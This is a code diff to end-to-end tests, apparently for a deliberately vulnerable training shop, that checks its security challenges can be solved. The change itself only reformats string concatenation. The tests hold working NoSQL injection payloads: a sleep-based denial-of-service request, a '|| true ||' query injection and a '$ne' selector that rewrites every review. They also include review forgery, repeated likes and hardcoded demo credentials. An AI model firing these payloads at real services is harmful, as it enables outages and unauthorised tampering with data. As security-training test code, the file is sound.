@@ -8,12 +8,12 @@ const utils = require('../../lib/utils')
 
 describe('/rest/products/reviews', () => {
   beforeEach(() => {
-    browser.get(protractor.basePath + '/#/search')
+    browser.get(`${protractor.basePath}/#/search`)
   })
 
   if (!utils.disableOnContainerEnv()) {
     describe('challenge "NoSQL DoS"', () => {
-      protractor.beforeEach.login({ email: 'admin@' + config.get('application.domain'), password: 'admin123' })
+      protractor.beforeEach.login({ email: `admin@${config.get('application.domain')}`, password: 'admin123' })
 
       it('should be possible to inject a command into the get route', () => {
         browser.waitForAngularEnabled(false)
@@ -24,7 +24,7 @@ describe('/rest/products/reviews', () => {
               console.log('Success')
             }
           }
-          xhttp.open('GET', baseUrl + '/rest/products/sleep(1000)/reviews', true)
+          xhttp.open('GET', `${baseUrl}/rest/products/sleep(1000)/reviews`, true)
           xhttp.setRequestHeader('Content-type', 'text/plain')
           xhttp.send()
         }, browser.baseUrl)
@@ -44,7 +44,7 @@ describe('/rest/products/reviews', () => {
               console.log('Success')
             }
           }
-          xhttp.open('GET', baseUrl + '/rest/track-order/%27%20%7C%7C%20true%20%7C%7C%20%27', true)
+          xhttp.open('GET', `${baseUrl}/rest/track-order/%27%20%7C%7C%20true%20%7C%7C%20%27`, true)
           xhttp.setRequestHeader('Content-type', 'text/plain')
           xhttp.send()
         }, browser.baseUrl)
@@ -58,7 +58,7 @@ describe('/rest/products/reviews', () => {
   describe('challenge "NoSQL Manipulation"', () => {
     it('should be possible to inject a selector into the update route', () => {
       browser.waitForAngularEnabled(false)
-      browser.executeScript('var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.status == 200) { console.log("Success"); } }; xhttp.open("PATCH","'+browser.baseUrl+'/rest/products/reviews", true); xhttp.setRequestHeader("Content-type","application/json"); xhttp.setRequestHeader("Authorization", `Bearer ${localStorage.getItem("token")}`); xhttp.send(JSON.stringify({ "id": { "$ne": -1 }, "message": "NoSQL Injection!" }));') // eslint-disable-line
+      browser.executeScript(`var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.status == 200) { console.log("Success"); } }; xhttp.open("PATCH","${browser.baseUrl}/rest/products/reviews", true); xhttp.setRequestHeader("Content-type","application/json"); xhttp.setRequestHeader("Authorization", \`Bearer $\{localStorage.getItem("token")}\`); xhttp.send(JSON.stringify({ "id": { "$ne": -1 }, "message": "NoSQL Injection!" }));`) // eslint-disable-line
       browser.driver.sleep(1000)
       browser.waitForAngularEnabled(true)
     })
@@ -66,7 +66,7 @@ describe('/rest/products/reviews', () => {
   })
 
   describe('challenge "Forged Review"', () => {
-    protractor.beforeEach.login({ email: 'mc.safesearch@' + config.get('application.domain'), password: 'Mr. N00dles' })
+    protractor.beforeEach.login({ email: `mc.safesearch@${config.get('application.domain')}`, password: 'Mr. N00dles' })
 
     it('should be possible to edit any existing review', () => {
       browser.waitForAngularEnabled(false)
@@ -79,7 +79,7 @@ describe('/rest/products/reviews', () => {
           }
         }
 
-        xhttp.open('GET', baseUrl + '/rest/products/1/reviews', true)
+        xhttp.open('GET', `${baseUrl}/rest/products/1/reviews`, true)
         xhttp.setRequestHeader('Content-type', 'text/plain')
         xhttp.send()
 
@@ -90,7 +90,7 @@ describe('/rest/products/reviews', () => {
               console.log('Success')
             }
           }
-          xhttp.open('PATCH', baseUrl + '/rest/products/reviews', true)
+          xhttp.open('PATCH', `${baseUrl}/rest/products/reviews`, true)
           xhttp.setRequestHeader('Content-type', 'application/json')
           xhttp.setRequestHeader('Authorization', `Bearer ${localStorage.getItem('token')}`)
           xhttp.send(JSON.stringify({ id: reviewId, message: 'injected' }))
@@ -103,7 +103,7 @@ describe('/rest/products/reviews', () => {
   })
 
   describe('challenge "Multiple Likes"', () => {
-    protractor.beforeEach.login({ email: 'mc.safesearch@' + config.get('application.domain'), password: 'Mr. N00dles' })
+    protractor.beforeEach.login({ email: `mc.safesearch@${config.get('application.domain')}`, password: 'Mr. N00dles' })
 
     it('should be possible to like reviews multiple times', () => {
       browser.waitForAngularEnabled(false)
@@ -118,7 +118,7 @@ describe('/rest/products/reviews', () => {
           }
         }
 
-        xhttp.open('GET', baseUrl + '/rest/products/1/reviews', true)
+        xhttp.open('GET', `${baseUrl}/rest/products/1/reviews`, true)
         xhttp.setRequestHeader('Content-type', 'text/plain')
         xhttp.send()
 
@@ -129,7 +129,7 @@ describe('/rest/products/reviews', () => {
               console.log('Success')
             }
           }
-          xhttp.open('POST', baseUrl + '/rest/products/reviews', true)
+          xhttp.open('POST', `${baseUrl}/rest/products/reviews`, true)
           xhttp.setRequestHeader('Content-type', 'application/json')
           xhttp.setRequestHeader('Authorization', `Bearer ${localStorage.getItem('token')}`)
           xhttp.send(JSON.stringify({ id: reviewId }))
